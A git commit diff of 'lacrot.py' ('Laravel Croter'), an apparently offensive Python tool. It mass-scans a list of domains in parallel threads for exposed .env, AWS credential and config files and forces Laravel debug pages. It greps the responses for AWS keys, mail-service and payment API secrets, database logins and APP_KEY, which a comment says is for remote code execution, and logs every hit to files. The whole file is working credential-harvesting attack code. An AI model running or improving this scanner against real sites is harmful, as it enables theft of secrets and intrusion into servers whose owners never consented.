8d2ea9c8c3f6077d2fd5ef868302cd1eb114ed3d
GraciusAlfarisi <88748717+GraciusAlfarisi@users.noreply.github.com>
2021-08-17 22:34:21 +0700

    Update lacrot.py

--- lacrot.py
+++ lacrot.py
@@ -1,3 +1,4 @@
+import sys
 import requests
 from multiprocessing.dummy import Pool
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -20,39 +21,37 @@ init()
 # NOTE: GW MALES REGEX, RESULT OTOMATIS KESAVE.
 
 class AWS_SUCK:
-	def __init__(self):
-		# BIKIN DIRECTORY
-		self.red  = '\033[91m'
-		self.blue  = '\033[94m'
-		self.green = '\033[92m'
-		self.white = '\033[00m'
-		self.cyan    = '\033[0;96m'
-		self.kolor_lo = [self.red, self.blue, self.green, self.white, self.cyan]
-		self.date = datetime.datetime.now().date()
-		try:
-			pwd = os.getcwd()
-			self.Outputs = os.path.join(pwd, "output/"+str(self.date)+"/")
-			os.makedirs(self.Outputs)
-		except:
-			pass
-		# TAMBAHIN SENDIRI 
-		self.path = [
-			"/.env",
-			"/.env.bak",
-			"/.aws/credentials"
-			"/phpinfo",
-			"/phpinfo.php",
-			"/aws.yml", 
-			"/info.php", 
-			"/config/aws.yml", 
-		]
+    def __init__(self):
+        # BIKIN DIRECTORY
+        self.red  = '\033[91m'
+        self.blue  = '\033[94m'
+        self.green = '\033[92m'
+        self.white = '\033[00m'
+        self.cyan    = '\033[0;96m'
+        self.kolor_lo = [self.red, self.blue, self.green, self.white, self.cyan]
+        self.date = datetime.datetime.now().date()
+        try:
+            pwd = os.getcwd()
+            self.Outputs = os.path.join(pwd, "output/"+str(self.date)+"/")
+            os.makedirs(self.Outputs)
+        except:
+            pass
+        # TAMBAHIN SENDIRI 
+        self.path = [
+            "/.env",
+            "/.env.bak",
+            "/.aws/credentials"
+            "/aws.yml", 
+            "/info.php", 
+            "/config/aws.yml", 
+        ]
 
 
 
 
-	# banner biar kek heker pro
-	def banner(self):
-		print("""{}
+    # banner biar kek heker pro
+    def banner(self):
+        print("""{}
 
 
 
@@ -64,120 +63,124 @@ class AWS_SUCK:
         {}                               
     Start date: {}
 
-			""".format(random.choice(self.kolor_lo), "Laravel Croter",  "Coded By Justakazh", self.date))
+            """.format(random.choice(self.kolor_lo), "Laravel Croter",  "Coded By Justakazh", self.date))
 
 
-	# CHECK DULU TOD
-	def check(self, content, url):
-		try:
-			isi = content.text
+    # CHECK DULU TOD
+    def check(self, content, url):
+        try:
+            isi = content.text
 
-			# TAMBAHIN KATA YANG KALIAN CARI
+            # TAMBAHIN KATA YANG KALIAN CARI
 
-			# TWILLIO
-			if "TWILIO" in isi or "twilio" in isi:
-				print ("{}[!] FOUND TWILIO {}".format(self.green, url))
-				self.save("TWILIO.txt", url)
-	        
-			# AWS
-			if "AKIA" in isi:
-				print ("{}[!] FOUND AWS {}".format(self.green, url))
-				self.save("AWS.txt", url)
+            # TWILLIO
+            if "TWILIO" in isi or "twilio" in isi:
+                print ("{}[!] FOUND TWILIO {}".format(self.green, url))
+                self.save("TWILIO.txt", url)
+            
+            # AWS
+            if "AKIA" in isi:
+                print ("{}[!] FOUND AWS {}".format(self.green, url))
+                self.save("AWS.txt", url)
 
-			# NEXMO
-			if "NEXMO" in isi or "nexmo" in isi:
-				print ("{}[!] FOUND NEXMO {}".format(self.green, url))
-				self.save("NEXMO.txt", url)
+            # NEXMO
+            if "NEXMO" in isi or "nexmo" in isi:
+                print ("{}[!] FOUND NEXMO {}".format(self.green, url))
+                self.save("NEXMO.txt", url)
 
-			# IONOS
-			if "ionos" in isi:
-				print ("{}[!] FOUND IONOS {}".format(self.green, url))
-				self.save("IONOS.txt", url)
+            # IONOS
+            if "ionos" in isi:
+                print ("{}[!] FOUND IONOS {}".format(self.green, url))
+                self.save("IONOS.txt", url)
+            
+            # amazonaws
+            if "amazonaws.com" in isi:
+                print ("{}[!] FOUND SMTP AWS {}".format(self.green, url))
+                self.save("SMTP_AMAZON.txt", url)
 
-			# PHPINFO
-			if "phpinfo()" in isi:
-				print ("{}[!] FOUND PHPINFO {}".format(self.green, url))
-				self.save("VARIABLE.txt", url)
-	        
-			# SMTP RANDOM
-			if "MAIL_PASSWORD" in isi:
-				print ("{}[!] FOUND MAIL OTHER {}".format(self.green, url))
-				self.save("MAIL-OTHER.txt", url)
+            # SMTP awsapps
+            if "awsapps.com" in isi:
+                print ("{}[!] FOUND SMTP AWSAPPS {}".format(self.green, url))
+                self.save("SMTP_AWSAPPS", url)
 
-			# SENDGRID
-			if "SG." in isi or "sendgrid" in isi:
-				print ("{}[!] FOUND SENDGRID {}".format(self.green, url))
-				self.save("SENDGRID.txt", url)
+            # SMTP RANDOM
+            if "MAIL_PASSWORD" in isi:
+                print ("{}[!] FOUND MAIL OTHER {}".format(self.green, url))
+                self.save("MAIL-OTHER.txt", url)
 
-			# COINPAYMENTS
-			if "COINPAYMENTS" in isi or "coinpayments" in isi:
-				print ("{}[!] FOUND COINPAYMENTS {}".format(self.green, url))
-				self.save("COINPAYMENTS.txt", url)
+            # SENDGRID
+            if "SG." in isi or "sendgrid" in isi:
+                print ("{}[!] FOUND SENDGRID {}".format(self.green, url))
+                self.save("SENDGRID.txt", url)
 
-			# OFFICE365
-			if "office365" in isi:
-				print ("{}[!] FOUND OFFICE365 {}".format(self.green, url))
-				self.save("OFFICE365.txt", url)
+            # COINPAYMENTS
+            if "COINPAYMENTS" in isi or "coinpayments" in isi:
+                print ("{}[!] FOUND COINPAYMENTS {}".format(self.green, url))
+                self.save("COINPAYMENTS.txt", url)
 
-			# MANDRILL
-			if "mandrillapp" in isi:
-				print ("{}[!] FOUND MANDRILL {}".format(self.green, url))
-				self.save("MANDRILL.txt", url)
+            # OFFICE365
+            if "office365" in isi:
+                print ("{}[!] FOUND OFFICE365 {}".format(self.green, url))
+                self.save("OFFICE365.txt", url)
 
-			# PLIVO
-			if "PLIVO" in isi or "plivo" in isi:
-				print ("{}[!] FOUND PLIVO {}".format(self.green, url))
-				self.save("PLIVO.txt", url)
+            # MANDRILL
+            if "mandrillapp" in isi:
+                print ("{}[!] FOUND MANDRILL {}".format(self.green, url))
+                self.save("MANDRILL.txt", url)
 
-			# APP_KEY -> BUAT RCE ANJG
-			if "APP_KEY" in isi:
-				print ("{}[!] FOUND APP_KEY {}".format(self.green, url))
-				self.save("APP_KEY.txt", url)
+            # PLIVO
+            if "PLIVO" in isi or "plivo" in isi:
+                print ("{}[!] FOUND PLIVO {}".format(self.green, url))
+                self.save("PLIVO.txt", url)
 
-			# MAILGUN
-			if "mailgun" in isi:
-				print ("{}[!] FOUND MAILGUN {}".format(self.green, url))
-				self.save("MAILGUN.txt", url)
+            # APP_KEY -> BUAT RCE ANJG
+            if "APP_KEY" in isi:
+                print ("{}[!] FOUND APP_KEY {}".format(self.green, url))
+                self.save("APP_KEY.txt", url)
 
-			# DATABASE CREDENTIAL
-			if "DB_USERNAME" in isi:
-				print ("{}[!] FOUND DATABASE{}".format(self.green, url))
-				self.save("DATABASE.txt", url)
+            # MAILGUN
+            if "mailgun" in isi:
+                print ("{}[!] FOUND MAILGUN {}".format(self.green, url))
+                self.save("MAILGUN.txt", url)
 
-			# BAD LUCKY :(
-			else:
-				print ("{}[-] NOTHING {}".format(self.red, url))
+            # DATABASE CREDENTIAL
+            if "DB_USERNAME" in isi:
+                print ("{}[!] FOUND DATABASE{}".format(self.green, url))
+                self.save("DATABASE.txt", url)
 
-		except:
-			pass
+            # BAD LUCKY :(
+            else:
+                print ("{}[-] BAD LARAVEL {}".format(self.red, url))
+
+        except:
+            pass
 
     # SIMPEN TAPI BUKAN JADI SIMPENAN
-	def save(self, title, url):
-		try:
-			open(self.Outputs+"/"+title, "a").write(url+"\n")
-		except:
-			pass
+    def save(self, title, url):
+        try:
+            open(self.Outputs+"/"+title, "a").write(url+"\n")
+        except:
+            pass
 
-	# REQUEST
-	def akurapopo(self, domain):
-		try:
-			for a in self.path:
-				url = domain+a
-				r = requests.get(url, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"})
-				self.check(r, url)
-			rr = requests.get(url, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"}, data="halomin[]=asu")
-			self.check(rr, url+" [DEBUG POST]")
-		except:
-			pass
+    # Check Domain Aktif ga tu 
+    # REQUEST
+    def akurapopo(self, domain):
+        try:
+            for a in self.path:
+                url = domain+a
+                r = requests.get(url, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"}, verify=False, allow_redirects=False)
+                self.check(r, url)
+            rr = requests.get(url, headers={"user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0; Mandajanganpergi) Gecko/20190101 Firefox/77.0"}, data="halomin[]=asu", verify=False, allow_redirects=False)
+            self.check(rr, url+" [DEBUG POST]")
+        except:
+            print ("{}[!] BAD SITE {}".format(self.red, domain))
 
 
 matur_sembah_nuwun_sanget_sampun_nate_nglarani = AWS_SUCK()
 matur_sembah_nuwun_sanget_sampun_nate_nglarani.banner()
-tresno = [i.strip() for i in open(str(input("List : "))).readlines()]
-lali = Pool(int(input('Thread : ')))
+tresno = [i.strip() for i in open(str(sys.argv[1])).readlines()]
+lali = Pool(int(sys.argv[2]))
 lali.map(matur_sembah_nuwun_sanget_sampun_nate_nglarani.akurapopo, tresno)
-
-
 
 # REFERENCE
 # - Suhada 
